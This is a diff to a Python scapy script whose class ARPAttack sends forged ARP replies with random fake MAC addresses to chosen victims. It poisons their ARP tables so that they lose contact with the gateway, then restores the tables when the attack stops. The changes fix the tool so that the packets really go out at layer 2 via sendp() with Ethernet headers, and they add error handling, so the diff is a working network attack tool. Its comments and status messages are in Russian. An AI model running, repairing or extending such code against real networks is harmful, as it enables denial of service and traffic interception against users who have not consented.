@@ -1,7 +1,7 @@
 import time
 import sys
 import random
-from scapy.all import send, ARP
+from scapy.all import sendp, ARP, Ether
 from modules.arp_utils import generate_fake_mac
 
 class ARPAttack:
@@ -48,8 +48,8 @@ class ARPAttack:
                     # Генерируем случайный ложный MAC
                     fake_mac = generate_fake_mac()
                     
-                    # Отправляем жертве ложный ARP-ответ
-                    arp_packet = ARP(
+                    # Создаем Ethernet + ARP пакет
+                    arp_packet = Ether(dst=victim['mac']) / ARP(
                         op=2,  # ARP reply
                         pdst=victim['ip'],
                         hwdst=victim['mac'],
@@ -57,7 +57,8 @@ class ARPAttack:
                         hwsrc=fake_mac
                     )
                     
-                    send(arp_packet, verbose=False)
+                    # Используем sendp() для L2 пакетов
+                    sendp(arp_packet, verbose=False, iface=self.interface)
                     self.packets_sent += 1
                 
                 # Обновление статуса
@@ -74,10 +75,17 @@ class ARPAttack:
                 time.sleep(0.2)
                 
         except KeyboardInterrupt:
+            print("\n\033[1;33m[!] Остановка атаки...\033[0m")
+            self.stop_attack()
+        except Exception as e:
+            print(f"\n\033[1;31m[!] Ошибка во время атаки: {str(e)}\033[0m")
             self.stop_attack()
     
     def stop_attack(self):
         """Остановка атаки и восстановление ARP таблиц"""
+        if not self.attack_active:
+            return
+        
         self.attack_active = False
         
         print(f"\n\n\033[1;32m{'═'*60}\033[0m")
@@ -89,14 +97,15 @@ class ARPAttack:
             print(f"\033[1;33m[*] Восстанавливаю ARP-таблицу жертвы {victim['ip']}...\033[0m")
             
             for i in range(20):
-                restore_packet = ARP(
+                restore_packet = Ether(dst=victim['mac']) / ARP(
                     op=2,
                     pdst=victim['ip'],
                     hwdst=victim['mac'],
                     psrc=self.gateway_ip,
                     hwsrc=self.gateway_mac
                 )
-                send(restore_packet, verbose=False)
+                # Используем sendp() для L2 пакетов
+                sendp(restore_packet, verbose=False, iface=self.interface)
                 time.sleep(0.05)
             
             print(f"\033[1;32m[✓] Жертва {victim['ip']} восстановлена\033[0m")
@@ -105,3 +114,6 @@ class ARPAttack:
         print(f"\n\033[1;32m[✓] Всего отправлено пакетов: {self.packets_sent}\033[0m")
         print(f"\033[1;32m[✓] Общее время атаки: {elapsed} секунд\033[0m")
         print(f"\033[1;32m[✓] Все жертвы снова видят шлюз {self.gateway_ip}\033[0m")
+        
+        # Очищаем список жертв
+        self.victims = []
